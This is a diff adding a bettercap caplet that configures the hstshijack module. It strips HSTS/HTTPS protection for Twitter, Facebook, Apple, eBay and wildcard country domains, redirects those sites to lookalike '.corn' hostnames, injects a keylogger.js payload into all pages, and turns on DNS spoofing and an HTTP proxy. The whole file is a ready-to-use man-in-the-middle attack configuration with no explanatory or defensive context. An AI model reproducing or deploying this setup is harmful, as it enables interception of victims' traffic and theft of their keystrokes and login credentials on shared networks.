@@ -1,0 +1,14 @@
+set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl.log
+set hstshijack.ignore          *
+set hstshijack.targets         twitter.com,*.twitter.com,facebook.com,*.facebook.com,apple.com,*.apple.com,ebay.com,*.ebay.com, *.com, *.ar, *.au, *.be, *.br, *.io, *.vg, *.bg, *.ca, *.cn, *.cc, *.co, *.dk, *.eg, *.uk, *.co.uk, *.eu, *.fr, *.de, *.gr, *.nl, *.in, *.ir, *.ie, *.jp, *.jo, *.kr, *.co.il, *.fm, *.nz, *.pk, *.pl, *.ru, *.sh, *.sa, *.es, *.se, *.sz, *.tw, *.tv, *.ae, *.us
+set hstshijack.replacements    twitter.corn,*.twitter.corn,facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn, *.com, *.ar, *.au, *.be, *.br, *.io, *.vg, *.bg, *.ca, *.cn, *.cc, *.co, *.dk, *.eg, *.uk, *.co.uk, *.eu, *.fr, *.de, *.gr, *.nl, *.in, *.ir, *.ie, *.jp, *.jo, *.kr, *.co.il, *.fm, *.nz, *.pk, *.pl, *.ru, *.sh, *.sa, *.es, *.se, *.sz, *.tw, *.tv, *.ae, *.us
+set hstshijack.obfuscate       false
+set hstshijack.encode          false
+set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js 
+
+
+set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
+set dns.spoof.domains  twitter.corn,*.twitter.corn,facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn, *.com, *.ar, *.au, *.be, *.br, *.io, *.vg, *.bg, *.ca, *.cn, *.cc, *.co, *.dk, *.eg, *.uk, *.co.uk, *.eu, *.fr, *.de, *.gr, *.nl, *.in, *.ir, *.ie, *.jp, *.jo, *.kr, *.co.il, *.fm, *.nz, *.pk, *.pl, *.ru, *.sh, *.sa, *.es, *.se, *.sz, *.tw, *.tv, *.ae, *.us
+
+http.proxy  on
+dns.spoof   on
